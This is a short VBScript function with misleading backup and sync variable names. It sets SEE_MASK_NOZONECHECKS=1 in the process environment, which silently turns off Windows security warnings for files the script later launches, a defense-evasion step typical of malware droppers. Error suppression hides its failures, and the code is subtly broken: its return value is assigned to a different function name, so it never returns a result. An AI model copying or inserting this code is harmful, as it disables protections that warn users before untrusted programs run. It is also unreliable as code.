Function ReadBackupCipher2()
On Error Resume Next
  Dim strManifestRaw48,strSyncBuffer89,strEntry117
  Set strManifestRaw48=CreateObject("WScript.Shell")
  strSyncBuffer89=strManifestRaw48.ExpandEnvironmentStrings("%TEMP%")
  strEntry117=strManifestRaw48.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strSyncBuffer89)>0 And Len(strEntry117)>0 Then
    strManifestRaw48.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    ExtractSyncToken27=1
    Exit Function
  End If
  ExtractSyncToken27=0
End Function

